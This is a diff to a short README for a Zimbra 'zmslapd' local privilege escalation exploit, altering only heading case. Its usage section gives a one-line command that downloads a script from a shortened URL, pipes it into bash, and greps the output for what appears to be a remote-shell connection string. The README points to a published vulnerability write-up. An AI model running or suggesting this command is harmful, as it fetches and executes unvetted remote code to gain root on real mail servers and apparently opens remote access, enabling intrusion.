@@ -1,8 +1,8 @@
-# zimbra-slapper
+# Zimbra local ROOT exploit
 Zimbra "zmslapd" local root exploit rewriten by Aels
-# usage
+# Usage
 ```
 curl -fskSL is.gd/zimbslap | bash 2>&1 | grep -oE "gs.+-i"
 ```
-# details
+# Details
 https://darrenmartyn.ie/2021/10/27/zimbra-zmslapd-local-root-exploit/
